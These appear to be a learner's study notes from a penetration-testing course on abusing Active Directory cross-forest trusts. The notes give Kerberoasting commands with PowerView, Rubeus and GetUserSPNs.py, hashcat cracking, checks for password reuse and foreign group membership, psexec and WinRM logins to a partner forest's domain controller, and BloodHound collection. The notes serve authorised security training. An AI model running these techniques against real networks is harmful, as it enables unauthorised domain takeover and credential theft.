# 1- Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows

**Bidirectional:** Parent-child, Cross-link, ==Tree-root, Forest==
## 1- Cross-Forest Kerberoasting
**Kerberos attacks like Kerberoasting and ASREPRoasting can work across trusts, depending on trust direction.** If you’re in a domain with inbound or bidirectional domain/forest trusts, you may target other domains. Even if you can’t escalate locally, you can request tickets, crack hashes, and compromise accounts (e.g., Domain or Enterprise Admins) that have privileges in multiple domains.
We can utilize PowerView to enumerate accounts in a target domain that have SPNs associated with them.
#### Enumerating Accounts for Associated SPNs Using Get-DomainUser
```powershell
import-module powerview.sp1
 Get-DomainUser -SPN -Domain <DOMAIN-2.LOCAL> | select SamAccountName
    # <USER-SRV>
```
We see that there is one account with an SPN in the target domain. 
#### Enumerating the mssqlsvc Account
```powershell
import-module powerview.sp1
Get-DomainUser -Domain <DOMAIN-2.LOCAL> -Identity <USER-SRV> |select samaccountname,memberof
   # CN=Domain Admins,CN=Users,DC= <DOMAIN-2.LOCAL>
```
[+] . A quick check shows that this account is a member of the ==Domain Admins group== in the target domain, so if we can Kerberoast it and crack the hash offline, we'd have full admin rights to the target domain.
#### Performing a Kerberoasting Attacking with Rubeus Using /domain Flag
Let's perform a Kerberoasting attack across the trust using Rubeus. We run the tool as we did in the Kerberoasting section, but we include the /domain: flag and specify the target domain.
```powershell
.\Rubeus.exe kerberoast /domain:<DOMAIN-2.LOCAL>  /user:<USER-SRV> /nowrap
   # [*] Hash : <hash>
```

We could then run the hash through Hashcat. If it cracks, we've now quickly expanded our access to fully control two domains by leveraging a pretty standard attack and abusing the authentication direction and setup of the bidirectional forest trust.
#### Cracking the Hash with Hashcat

```bash
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt  
```

## 2-Admin Password Re-Use & Group Membership

bidirectional forest trust managed by admins from the same company:
**Admin Password Re-Use:**
-  If ==Domain A== is compromised and we obtain: ==Clear Text Password== or  ==NT hashes== of **Administrator** or **Enterprise/Domain Admins** accounts (ex. `adm_bob.smith`). and ==Domain B== has a highly privileged account with the same name(ex. `bsmith_admim`) ==worth checking for password reuse across the two forests==

**Group Membership:**
-  We may also see users or admins from Domain A as members of a group in Domain B. Only `Domain Local Groups` allow security principals from outside its forest. We may see a Domain Admin or Enterprise Admin from Domain A as a member of the built-in Administrators group in Domain B in a bidirectional forest trust relationship. If we can take over this admin user in Domain A, we would gain full administrative access to Domain B based on group membership

We can use the PowerView function [Get-DomainForeignGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainForeignGroupMember) to enumerate groups with users that do not belong to the domain, also known as `foreign group membership`. Let's try this against the `DOMAIN-2.LOCAL` domain with which we have an external bidirectional forest trust.
#### Using Get-DomainForeignGroupMember
```powershell
# Get-DomainForeignGroupMember -Domain <DOMAIN-2.LOCAL>
# GroupDomain             : <DOMAIN-2.LOCAL>
# GroupName               : Administrators
# GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=DOMAIN-2,DC=LOCAL
# MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500

# get the Group member
Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
   # DOMAIN\administrator
```
[+ ] The above command output shows that the **built-in Administrators group** in `DOMAIN-2.LOCAL` has the built-in Administrator account for the `DOMAIN.LOCAL` domain as a member. 

 if we compromise DOMAIN\administrator  We can verify this access dc of domain-2  using the `Enter-PSSession` cmdlet to connect over WinRM.
#### Accessing DC03 Using Enter-PSSession
```powershell
 Enter-PSSession -ComputerName <COMPUTER-DC03.DOAMIN-2.LOCAL> -Credential <DOMAIN>\administrator
```

[+] We authenticated to `DOMAIN-2.LOCAL` DC using an `DOMAIN.LOCAL` admin account via the bidirectional forest trust. This is a quick win worth checking when both forests are in scope.

## 3- SID History Abuse - Cross Forest

SID History can also be abused across a forest trust. If a user is migrated from one forest to another and SID Filtering is not enabled, it becomes possible to add a SID from the other forest, and this SID will be added to the user's token when authenticating across the trust. If the SID of an account with administrative privileges in Forest A is added to the SID history attribute of an account in Forest B, assuming they can authenticate across the forest, then this account will have administrative privileges when accessing resources in the partner forest. In the below diagram, we can see an example of the `jjones` user being migrated from the `INLANEFREIGHT.LOCAL` domain to the `CORP.LOCAL` domain in a different forest. If SID filtering is not enabled when this migration is made and the user has administrative privileges (or any type of interesting rights such as ACE entries, access to shares, etc.) in the `INLANEFREIGHT.LOCAL` domain, then they will retain their administrative rights/access in `INLANEFREIGHT.LOCAL` while being a member of the new domain, `CORP.LOCAL` in the second forest.
![[Pasted image 20250905145741.png]]
This attack will be covered in-depth in a later module focusing more heavily on attacking AD trusts.
# 2- Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux
As we saw in the previous section, it is often possible to Kerberoast across a forest trust. If this is possible in the environment we are assessing, we can perform this with `GetUserSPNs.py` from our Linux attack host. To do this, we need credentials for a user that can authenticate into the other domain and specify the `-target-domain` flag in our command. Performing this against the `DOMAIN-2.LOCAL` domain, we see one SPN entry for the `USER-SRV` account.
## 1- Cross-Forest Kerberoasting

#### Find SPN Acoount Using GetUserSPNs.py
```bash
GetUserSPNs.py -target-domain <DOMAIN-2.LOCAL> <DOMAIN.LOCAL>/<-OUR-USER>:<PASS>
# Name:<USER-SRV>  , MemberOf: CN=Domain Admins,CN=Users,DC=DOMAIN-2.LOCAL
```
#### Get TGS of the SPN Acoount Using the -request Flag
Rerunning the command with the `-request` flag added gives us the TGS ticket. We could also add `-outputfile <OUTPUT FILE>` to output directly into a file that we could then turn around and run Hashcat against.
```bash
GetUserSPNs.py -request -target-domain <DOMAIN-2.LOCAL> <DOMAIN.LOCAL>/<-OUR-USER>:<PASS>
```
We could then attempt to crack this offline using Hashcat with mode `13100`
#### Cracking the Hash with Hashcat

```bash
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt  
```
If successful, we'd be able to authenticate into the `DOAMIN-2.LOCAL` domain as a Domain Admin. If we are successful with this type of attack during a real-world assessment, it would also be worth checking to see if this account exists in our current domain and if it suffers from password re-use. This could be a quick win for us if we have not yet been able to escalate in our current domain. Even if we already have control over the current domain, it would be worth adding a finding to our report if we do find password re-use across similarly named accounts in different domains.
#### Login to DC of DOMAIN-2 
after cracking 
```bash
psexec.py <DOMAIN-2.LOCAL>/USER@COMPUTER-2-DC02.DOMAIN-2.LOCAL -target-ip <DOMAIN-2-DC02>
```
## 2- Hunting Foreign Group Membership with Bloodhound-python
Admins or users from one domain can appear in groups of another domain, especially via Domain Local Groups in a bidirectional forest trust. A privileged Domain A user may be in Domain B’s administrators group. From a Linux host, Python BloodHound can collect and analyze multi-domain data to find these relationships.

If our attack host lacks DNS, we must edit **resolv.conf** with sudo to add the domain and the DC’s IP (e.g., COMPUTER-DC01) as the nameserver, commenting out existing entries.
#### Adding DOMAIN.LOCAL Information to /etc/resolv.conf
```bash
cat /etc/resolv.conf 
  # mdomain DOMAIN.LOCAL
  # nameserver 172.16.5.5
```
Once this is in place, we can run the tool against the target domain as follows:
#### Running bloodhound-python Against DOMAIN.LOCAL
```bash
bloodhound-python -d <DOMAIN.LOCAL> -dc COMPUTER-DC01 -c All -u <USER> -p <PASSWORD>
# We can compress the resultant zip files
zip -r ilfreight_bh.zip *.json
```

We will repeat the same process, this time filling in the details for the `DOMAIN-2.LOCAL` domain.
#### Adding DOMAIN-2.LOCAL Information to /etc/resolv.conf
```bash
cat /etc/resolv.conf 
  # mdomain DOMAIN-2.LOCAL
  # nameserver 172.16.5.238
```
The `bloodhound-python` command will look similar to the previous one:
#### Running bloodhound-python Against DOAMIN-2.LOCAL
```bash
bloodhound-python -d <DOMAIN-2.LOCAL> -dc COMPUTER-2-DC02 -c All -u <USER> -p <PASSWORD>
```

After uploading the second set of data (either each JSON file or as one zip file), we can click on `Users with Foreign Domain Group Membership` under the `Analysis` tab and select the source domain as `INLANEFREIGHT.LOCAL`. Here, we will see the built-in Administrator account for the INLANEFREIGHT.LOCAL domain is a member of the built-in Administrators group in the FREIGHTLOGISTICS.LOCAL domain as we saw previously.
#### Viewing Dangerous Rights through BloodHound
![[Pasted image 20250905192540.png]]